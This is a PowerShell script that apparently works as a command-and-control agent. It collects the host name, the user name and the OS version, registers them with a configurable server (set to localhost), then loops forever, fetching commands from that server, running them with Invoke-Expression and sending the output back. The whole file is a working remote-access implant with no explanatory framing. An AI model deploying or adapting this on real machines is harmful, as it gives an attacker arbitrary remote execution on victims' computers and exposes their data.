$ServerIP="127.0.0.1"
$ServerPort="80"

$Hostname = $env:COMPUTERNAME
$userRaw = whoami
$Username = $userRaw -split '\\' | Select-Object -Last 1
$OS = (Get-CimInstance Win32_OperatingSystem).Caption
$Version = (Get-CimInstance Win32_OperatingSystem).Version
$ID = "$Username@$Hostname"
$Server = "http://$ServerIp`:$ServerPort"

# Register
Invoke-RestMethod -Uri "$Server/register" -Method Post -Body @{
    id = $ID
    hostname = $Hostname
    username = $Username
    os = $OS
    version = $Version
}

# Command loop
while ($true) {
    try {
        $Cmd = Invoke-RestMethod -Uri "$Server/$ID.html"
        if ($Cmd) {
            $Result = try {
                Invoke-Expression $Cmd | Out-String
            } catch {
                $_ | Out-String
            }
            Invoke-RestMethod -Uri "$Server/$ID/result" -Method Post -Body @{
                cmd = $Cmd
                result = $Result
            }
        }
    } catch {}
    Start-Sleep -Seconds 1
}
